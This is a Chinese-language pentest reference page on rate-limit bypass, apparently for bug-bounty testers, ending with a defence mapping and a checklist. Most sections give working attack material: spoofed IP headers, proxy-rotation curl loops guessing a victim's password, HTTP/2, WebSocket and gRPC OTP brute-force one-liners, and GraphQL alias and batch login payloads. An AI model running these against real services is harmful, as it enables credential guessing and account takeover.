---
attack_surface: [配置缺陷, 竞态/时序]
impact: [身份伪造, 权限提升, 可用性破坏]
risk_level: 高
prerequisites:
  - HTTP 协议基础
  - Burp Suite 基础操作
  - 理解速率限制的基本工作方式
related_techniques:
  - 2fa-otp-bypass
  - reset-forgotten-password-bypass
  - login-bypass
  - brute-force
difficulty: 中级
tools:
  - Burp Suite Professional (Intruder / Turbo Intruder)
  - IPRotate (Burp 扩展)
  - fireprox
  - hashtag-fuzz
  - websocat
  - grpcurl
  - proxychains4
---

# Rate Limit Bypass — 速率限制绕过全矩阵

> 关联文档：[2FA/OTP Bypass](../2FA-OTP%20Bypass/) · [Reset Forgotten Password Bypass](../Reset%20Forgotten%20Password%20Bypass/) · [Login Bypass](../Login%20Bypass/) · [Captcha Bypass](../Captcha%20Bypass/) · [Race Condition](../Race%20Condition/)

---

# 0x01 原理与分类

## 1.0 TL;DR

速率限制（Rate Limiting）是防御暴力破解、凭证填充、邮箱轰炸的核心机制。但多数实现在"如何标识一个请求来源"这一根本问题上存在缺陷——基于 IP、Session、Header 或连接计数的限制器各有盲区。攻击者可从 6 个维度绕过：请求身份伪造、端点语义混淆、连接层复用、应用层批处理、时间窗口竞速和基础设施分片。

## 1.1 速率限制的致命缺陷

所有速率限制器都必须回答同一个问题：**"这两个请求来自同一个客户端吗？"** 而答案是**推断**而非**确定**的。

```
请求到达 → [如何标识客户端？]
    ├── IP 地址       → 可伪造、可轮换、代理/CDN 遮蔽
    ├── Session Cookie → 可重置、可轮换
    ├── User-Agent    → 可任意修改
    ├── 请求路径+参数  → 可变形、可添加噪声参数
    ├── TCP 连接数     → HTTP/2 多路复用一连接多流
    └── 全局计数器     → CDN PoP 分片导致独立计数
```

**核心原则**：限制器的"身份模型"与实际请求来源之间的差距越大，绕过越容易。

## 1.2 攻击面分类

| 维度 | 值 |
|------|-----|
| 一级分类 | 配置缺陷（Configuration Weakness） |
| 二级关联 | 认证/授权绕过（利用绕过结果实现 ATO） |
| 影响维度 | 身份伪造、权限提升、可用性破坏 |

## 1.3 绕过技术总览 — 六层模型

```
┌──────────────────────────────────────────────────────────────────┐
│ Layer 6: 基础设施分片 — CDN PoP 独立计数器                         │
├──────────────────────────────────────────────────────────────────┤
│ Layer 5: 应用层批处理 — GraphQL aliases / REST batch / 滑动窗口   │
├──────────────────────────────────────────────────────────────────┤
│ Layer 4: 协议层复用 — HTTP/2 multiplexing / WebSocket / gRPC      │
├──────────────────────────────────────────────────────────────────┤
│ Layer 3: 身份轮换 — 代理池 / 多账户 / Session 轮换                │
├──────────────────────────────────────────────────────────────────┤
│ Layer 2: 端点变形 — 相似路径 / 参数噪声 / API 版本混淆             │
├──────────────────────────────────────────────────────────────────┤
│ Layer 1: 请求头伪造 — IP 头注入 / UA 轮换 / 空白字符注入           │
└──────────────────────────────────────────────────────────────────┘
```

---

# 0x02 请求身份伪造 — Header 与输入操纵

## 2.1 IP 来源头注入

### 原理

许多应用部署在反向代理或 CDN 之后，依赖 `X-Forwarded-For` 等 Header 获取真实客户端 IP 用于速率限制。如果应用服务器信任来自客户端的这些 Header（而非仅在代理层设置），攻击者可以通过轮换 Header 值伪装成来自不同 IP 的请求。

### 可操纵的 IP Header

```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1
```

### 双 X-Forwarded-For 技巧

部分解析器取第一个值，部分取最后一个值——发送两个相同的 Header 可覆盖两种解析逻辑：

```http
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

### Burp Intruder 配置

```
Payload 类型: Numbers (如 1-10000)
Payload 处理: 添加前缀 "127.0.0."
X-Forwarded-For: 127.0.0.§1§
```

### 检测方法

1. 向目标端点发送高频率请求（如 100 req/s），仅修改 `X-Forwarded-For` 值
2. 如果未触发 429 (Too Many Requests)，说明 IP 限制基于此 Header
3. 分别测试每个 IP Header（`X-Forwarded-For`、`X-Real-IP` 等），确定哪些被实际用于限制

## 2.2 其他标识 Header 轮换

### 原理

除 IP Header 外，速率限制还可能基于 `User-Agent` 或 `Cookie` 构建客户端指纹。轮换这些值可以与 IP 轮换配合，进一步降低被聚合识别的概率。

### 轮换维度

| Header | 轮换方式 |
|--------|---------|
| `User-Agent` | 使用真实浏览器的 UA 列表轮换 |
| `Cookie` | 使用 Pitchfork 攻击模式同时轮换 Session + Payload |
| `Accept-Language` | 添加多语言 Accept 头变化 |
| `Accept` | 轮换 Accept 内容类型 |

## 2.3 空白字符注入

### 原理

在参数值中插入空白字符（`%00`、`%0a`、`%0d`、`%09`、`%0C`、`%20`），后端可能将其规范化后处理，但速率限制器可能将 `code=1234` 和 `code=1234%0a` 视为不同的请求键，从而使每次请求在限制器看来都是唯一的。

### 可用字符

| 字符 | URL 编码 | 含义 |
|------|---------|------|
| Null | `%00` | 空字节终止 |
| LF | `%0a` | 换行 |
| CR | `%0d` | 回车 |
| CRLF | `%0d%0a` | 回车换行 |
| Tab | `%09` | 水平制表 |
| Form Feed | `%0C` | 换页 |
| Space | `%20` | 空格 |

### Payload 示例

```http
POST /api/verify HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

# 原始请求
code=1234

# 变体 1 - 尾部换行
code=1234%0a

# 变体 2 - 尾部空字节
code=1234%00

# 变体 3 - 值内空白
email=victim@target.com%0d%0a

# 变体 4 - 参数名加空白
code%09=1234
```

---

# 0x03 端点与语义变形

## 3.1 相似端点探索

### 原理

速率限制规则通常绑定到特定 URL 路径模式（如 `/api/v3/sign-up`）。通过探索大小写变体、版本号变体或命名约定差异，可能找到未受限制的等效端点。

### 端点变形清单

```
原始端点: /api/v3/sign-up

尝试变体:
/api/v3/Sign-up       # 大小写变化
/api/v3/SignUp        # 驼峰命名
/api/v3/singup        # 拼写简化
/api/v3/signup        # 去掉连字符
/api/v1/sign-up       # 旧版本 API
/api/v2/sign-up       # 中间版本
/api/sign-up          # 无版本号
/Sign-up              # 不同基础路径
/sign-up              # 纯小写根路径
/SignUp               # 驼峰根路径
```

### 检测方法

使用 Burp Intruder 的 Cluster Bomb 模式，对路径前缀和端点名称同时进行变体枚举。

## 3.2 API Gateway 参数噪声

### 原理

部分 API Gateway 将端点 + 参数组合作为速率限制的键。通过每次请求附加不同的无关参数，可以使每个请求在限制器看来都是唯一的。

### Payload

```http
# 原始请求
POST /resetpwd HTTP/1.1
Host: target.com

email=victim@target.com

# 变体 - 添加随机参数
POST /resetpwd?someparam=1 HTTP/1.1
POST /resetpwd?t=1716152634 HTTP/1.1
POST /resetpwd?cache_bust=random456 HTTP/1.1
POST /resetpwd?utm_source=brute HTTP/1.1
```

### Burp 配置

在 Intruder 中，使用 Payload 类型为 "Numbers" 或 "Random" 附加到 URL 查询字符串：

```
POST /resetpwd?noise=§1§ HTTP/1.1
```

---

# 0x04 身份与来源轮换

## 4.1 代理网络 IP 轮换

### 原理

将请求分散到多个代理 IP，使每个请求（或每组请求）在 IP 层面看起来来自不同的来源。这是绕过 IP 限制最直接有效的方式。

### 工具方案

```bash
# fireprox — AWS API Gateway 自动创建轮换 IP 端点
# https://github.com/ustayready/fireprox
fireprox --url https://target.com/api/ --command create

# hashtag-fuzz — 支持 Header 随机化 + 代理轮换 + 分块字典
# https://github.com/Hashtag-AMIN/hashtag-fuzz

# Burp IPRotate 扩展 — 在 Intruder/Turbo Intruder 中透明轮换代理 IP
# 使用 SOCKS/HTTP 代理池或 AWS API Gateway
```

### 手动代理轮换

```bash
# 使用代理列表轮换请求
for p in $(cat proxies.txt); do
  HTTPS_PROXY=$p curl -s -X POST https://target/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@target.com","password":"guess123"}' &
done
wait
```

## 4.2 多账户 / 多 Session 拆分

### 原理

如果速率限制基于每个账户或每个 Session，将攻击负载分散到多个账户身份或 Session Token 上可以规避单点限制。

### 实现方式

- 预先注册或获取 N 个低权限账户的 Session Token
- 在 Burp Intruder 中使用 Pitchfork 攻击模式：一个 Payload 位置放密码猜测，另一个 Payload 位置放 Session Token
- 每 K 次尝试后轮换到下一个账户/Session

### Pitchfork 攻击配置

```
POST /api/login HTTP/1.1
Cookie: session=§token§

{"email":"victim@target.com","password":"§pass§"}
```

- Payload 1 (token): 20 个不同账户的 Session Cookie，每个重复 5 次
- Payload 2 (pass): 密码字典

## 4.3 登入账户重置计数器

### 原理

对于登录端点的速率限制，每次暴力破解尝试前先使用有效凭据登录自己的账户，可能重置服务端的 `failed_attempts` 计数器。

### 实现

在 Burp Intruder 中为每次密码猜测请求配置前置请求（登录自己的账户）：

```
# Session Handling Rule → Run macro before each request:
1. GET /logout
2. POST /login (用自己的凭据)
3. Proceed with the actual brute-force request
```

---

# 0x05 协议层复用绕过

## 5.1 HTTP/2 多路复用

### 原理

HTTP/2 允许在单一 TCP 连接上并发发送多个请求（Stream Multiplexing）。多数速率限制器按 TCP 连接或 HTTP/1.1 请求计数，而非 HTTP/2 Stream 数。攻击者可在同一连接内打开数百个并发 Stream，而限制器仅扣除一个请求配额。

### 单连接并发爆破

```bash
# 在单个 HTTP/2 连接中发送 100 个 POST 请求
seq 1 100 | xargs -I@ -P0 curl -k --http2-prior-knowledge -X POST \
  -H "Content-Type: application/json" \
  -d '{"code":"@"}' https://target/api/v2/verify &>/dev/null
```

### Turbo Intruder HTTP/2 脚本

```python
# Turbo Intruder 支持 HTTP/2 并发爆破
# 关键配置:
#   maxConcurrentConnections: 1    ← 单连接
#   requestsPerConnection: 1000    ← 1000 个 Stream
#   engine: Engine.HTTP2
```

### 路径混淆组合

如果限制器保护 `/verify` 但未保护 `/api/v2/verify`，可同时利用路径变体 + HTTP/2 多路复用，实现极高速度的 OTP 或凭据爆破。

## 5.2 WebSocket / gRPC 升级绕过

### 原理

边缘速率限制器（WAF/CDN）通常仅检查初始 HTTP 升级请求（HTTP 101 Switching Protocols）。一旦连接升级为 WebSocket 或 gRPC 双向流，后续帧不再作为独立 HTTP 请求被审查。Cloudflare 官方文档确认：WebSocket 仅初始升级请求受 WAF/速率限制规则约束。

### WebSocket OTP 爆破

```bash
# 通过单个 WebSocket 连接发送 1000 个 OTP 猜测
seq -w 000000 000999 | websocat -n ws://target.tld/api/verify-ws
```

### gRPC 流式爆破

```bash
# 在单个 gRPC Stream 中发送多个验证请求
grpcurl -d @ -plaintext target.tld:50051 service.VerifyOTP/Stream <<'EOF'
{ "code": "111111" }
{ "code": "222222" }
{ "code": "333333" }
EOF
```

### 检测指纹

- 查找同一端点是否同时存在 HTTP REST 和 WebSocket 变体
- 查找 gRPC 端点（通常端口 50051 或路径包含 `proto`/`grpc`）
- 成功建立 WebSocket 连接后，监控服务端是否对高频帧返回限制响应

---

# 0x06 应用层批处理绕过

## 6.1 GraphQL Aliases 批量查询

### 原理

GraphQL 允许在同一请求中使用别名（Aliases）发送多条逻辑上独立的查询/变更。服务端会执行每个别名对应的操作，但速率限制器通常仅将整个请求计为一次。

### 利用方式

```graphql
mutation bruteForceOTP {
  a: verify(code:"111111") { token }
  b: verify(code:"222222") { token }
  c: verify(code:"333333") { token }
  d: verify(code:"444444") { token }
  e: verify(code:"555555") { token }
  # ... 可添加数十个别名
}
```

### 关键技术点

- 每个别名在服务端独立执行，只有匹配正确 OTP 的别名返回 200 OK
- 其他别名返回正常错误响应（如 "无效验证码"）
- **限制**：某些 GraphQL 实现将别名批量操作合并为单一数据库事务——如果限制器在应用层而非 GraphQL 层，此技术可能无效
- 此技术由 PortSwigger 2023 年研究普及，已在多个 Bug Bounty 中获得赏金

## 6.2 REST Batch / Bulk 端点滥用

### 原理

部分 API 提供批量操作端点（如 `/v2/batch`）或接受数组形式的请求体。如果速率限制仅部署在旧版单操作端点，批量端点可能完全不受限制。

### Payload — JSON 数组批量登录

```json
[
  {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"123"}},
  {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"456"}},
  {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"789"}}
]
```

### 检测方法

- 寻找 `/batch`、`/bulk`、`/multi` 等端点
- 测试是否接受数组格式替代单对象格式
- 将受限制的操作包装在批量请求中，检查响应

## 6.3 滑动窗口计时攻击

### 原理

Token Bucket 或 Leaky Bucket 算法的限制器在固定时间边界（如每分钟）重置计数器。如果知道窗口重置时间（通过 `X-RateLimit-Reset` Header 或观察 429 恢复时间），可以在窗口即将结束前打满配额，然后在下一秒立即开始新一轮。

### 利用策略

```
时间轴: |<-- 60s 窗口 -->|<-- 60s 窗口 -->|
请求:         ######              ######
              ↑ 窗口末尾          ↑ 新窗口开始
              打满配额            立即继续
```

### 实战步骤

1. 发送请求直到触发 429，记录时间 T
2. 等待 429 恢复，得到窗口大小 W（如 60s）
3. 在 T+55s 时发起配额上限（如 20 个请求）
4. 在 T+60s（新窗口）立即再次发起配额上限
5. 实际吞吐量提升 **2x**，无需修改请求内容

### 识别窗口大小

- `X-RateLimit-Reset: 27` → 27 秒后重置
- `X-RateLimit-Remaining` → 剩余配额
- `Retry-After: 45` → 45 秒后重试

---

# 0x07 基础设施层绕过 — CDN PoP 分片

## 7.1 原理

部分 CDN（如 Cloudflare）将速率限制计数器按数据中心（PoP / Point of Presence）分片，而非全局共享。Cloudflare 官方文档明确说明：**计数器不在数据中心之间共享**。这意味着同一个请求键（如 IP + 路径）在不同 PoP 有独立的配额桶。

## 7.2 利用方法

通过将请求路由到位于不同地理区域的出口节点（住宅代理池、Anycast VPN、绑定到不同大洲的云 VM），每个 PoP 独立维护计数器，总吞吐量 = 单 PoP 配额 × PoP 数量。

```bash
# 通过不同区域的代理发送请求
for p in $(cat proxies-by-region.txt); do
  HTTPS_PROXY=$p curl -s -X POST https://target/api/login \
    -H "Content-Type: application/json" \
    -d @payload.json &
done
wait
```

## 7.3 关键前提

- 限制器的键（Key）必须不是基于账户的——如果是 `user_id` 维度的限制，PoP 分片无效
- 需要可路由到不同 PoP 的代理池（住宅代理、多区域 VPS）
- 目标使用支持 PoP 分片的 CDN（Cloudflare、Fastly、Akamai 等均有类似行为）

---

# 0x08 重要策略 — 触发限制后继续尝试

## 8.1 原理

即使触发了速率限制（如 20 次错误尝试后返回 401/429），服务端仍可能在处理逻辑上区分"正确的凭证/OTP"与"错误的凭证/OTP"。一个被实际验证过的真实案例：限制器在 20 次失败后返回 401，但如果在此期间发送了正确的 OTP，服务端仍返回 200 并完成验证。

## 8.2 检测方法

1. 连续发送无效请求直到触发 429
2. 在触发限制后，**立即**发送一次真实有效的凭证/OTP
3. 观察响应 —— 如果返回 200 而非 429，说明限制器是"软限制"（仅标记但不阻断实际验证）

## 8.3 实战意义

不要因为 Intruder 中出现了 429 就立即停止攻击。将 Burp Intruder 配置为"继续攻击"模式，并**按响应状态码排序**——200 响应会在 429 海洋中孤立出现，那可能就是正确凭证。

---

# 0x09 工具矩阵

| 工具 | 用途 | 适用场景 |
|------|------|---------|
| **Burp Intruder** | 标准暴力破解，支持 Pitchfork/Cluster Bomb | Layer 1-3 |
| **Burp Turbo Intruder** | 高速攻击引擎，HTTP/2 多路复用 | Layer 4 |
| **IPRotate (Burp 扩展)** | SOCKS/HTTP 代理池 + AWS API Gateway 透明 IP 轮换 | Layer 3 |
| **[fireprox](https://github.com/ustayready/fireprox)** | 自动创建 AWS API Gateway 端点，每次请求不同 IP | Layer 3 |
| **[hashtag-fuzz](https://github.com/Hashtag-AMIN/hashtag-fuzz)** | 支持 Header 随机化、分块字典、轮询代理轮换 | Layer 1-3 |
| **websocat** | WebSocket 客户端，支持管道输入 | Layer 4 |
| **grpcurl** | gRPC 命令行客户端，支持流式请求 | Layer 4 |
| **proxychains4** | TCP 连接级代理包装 | Layer 3, 7 |

---

# 0x0A 检测与防御

## 10.1 分层防御策略

```
┌──────────────────────────────────────────────────┐
│ Layer 1: 客户端标识                                │
│ • 基于多个特征联合构建 Client Fingerprint           │
│   (IP + UA + Accept Headers + TLS Fingerprint)    │
│ • 使用 JA4/JA4+ TLS 指纹识别                       │
│ • 对 IP Header 做可信源校验（仅信任代理层 IP）      │
├──────────────────────────────────────────────────┤
│ Layer 2: 请求特征                                  │
│ • 参数规范化后再计数（剥离尾部空白、统一编码）       │
│ • 端点路径规范化（统一大小写、版本前缀）             │
│ • 识别并拒绝批量/别名 GraphQL 滥用                  │
├──────────────────────────────────────────────────┤
│ Layer 3: 协议检测                                  │
│ • 按 HTTP/2 Stream 而非 TCP 连接计数               │
│ • 对 WebSocket/gRPC 帧应用与 HTTP 同等的限制        │
│ • 检测同连接内异常的高 Stream 密度                  │
├──────────────────────────────────────────────────┤
│ Layer 4: 全局状态                                  │
│ • CDN 层面同步计数器（跨 PoP 共享状态）             │
│ • 基于账户而非 IP 的限制 + 基于 IP 的限制双层叠加   │
│ • 对关键操作（登录/重置）强制全局唯一请求序列        │
└──────────────────────────────────────────────────┘
```

## 10.2 技术-防御映射

| 绕过技术 | 攻击层 | 关键防御 |
|---------|-------|---------|
| IP Header 注入 | Layer 1 | 仅信任代理层设置的 IP Header；使用 `X-Real-IP` 单源 |
| UA/Cookie 轮换 | Layer 1 | 基于 TLS 指纹 + IP 子网聚合 |
| 空白字符注入 | Layer 1 | 参数值规范化后再生成限制键 |
| 相似端点 | Layer 2 | 端点模式全局覆盖（含大小写/版本变体） |
| API Gateway 参数噪声 | Layer 2 | 按路径+参数名（非参数值）建键 |
| 代理 IP 轮换 | Layer 3 | IP 子网聚合 + ASN 级别限制 |
| 多账户拆分 | Layer 3 | 基于目标资源而非源身份的计数 |
| HTTP/2 多路复用 | Layer 4 | 按 Stream 计数；限制单连接最大并发 Stream |
| WebSocket/gRPC 升级 | Layer 4 | 对升级后帧应用同等级别限制 |
| GraphQL Aliases | Layer 5 | 限制单个请求中的别名数量；解析并分别计数每个操作 |
| REST Batch | Layer 5 | 对批量端点的每个子操作分别计数 |
| 滑动窗口计时 | Layer 5 | 使用重叠窗口 + 突发惩罚机制 |
| CDN PoP 分片 | Layer 7 | 跨 PoP 计数器同步；基于账户的全局计数 |

## 10.3 安全测试检查清单

- [ ] 修改 `X-Forwarded-For` 后速率限制是否仍然触发？
- [ ] 测试每个 IP Header（`X-Real-IP`、`X-Client-IP` 等）的影响
- [ ] 是否可以通过附加随机查询参数绕过限制？
- [ ] 是否存在未受限制的旧版 API 端点？
- [ ] 大小写/拼写变体的端点是否绕过了限制？
- [ ] 登录自己的账户后，目标账户的失败计数器是否重置？
- [ ] HTTP/2 单连接并发请求是否均被独立计数？
- [ ] WebSocket 帧是否被计入速率限制？
- [ ] GraphQL 端点是否允许无限别名？
- [ ] 是否存在 `/batch` 或 `/bulk` 端点未受限制？
- [ ] `X-RateLimit-Reset` 或 `Retry-After` 是否存在？可用于窗口计时
- [ ] 429 响应后有效的凭证/OTP 是否仍然被接受？

---

## 参考资料

- [PortSwigger Research — GraphQL Authorization Bypass (2023)](https://portswigger.net/research/graphql-authorization-bypass)
- [PortSwigger Research — HTTP/2: The Sequel is Always Worse (2024)](https://portswigger.net/research/http2)
- [Cloudflare Docs — WebSockets & WAF Applicability (2025)](https://developers.cloudflare.com/network/websockets/)
- [Cloudflare Docs — Request Rate Calculation & PoP-Local Counters (2025)](https://developers.cloudflare.com/waf/rate-limiting-rules/request-rate/)
- [Medium — The $2,200 ATO Most Bug Hunters Overlooked](https://mokhansec.medium.com/the-2-200-ato-most-bug-hunters-overlooked-by-closing-intruder-too-soon-505f21d56732)
- [fireprox — AWS API Gateway IP Rotation](https://github.com/ustayready/fireprox)
- [hashtag-fuzz — Header Randomisation + Proxy Rotation](https://github.com/Hashtag-AMIN/hashtag-fuzz)
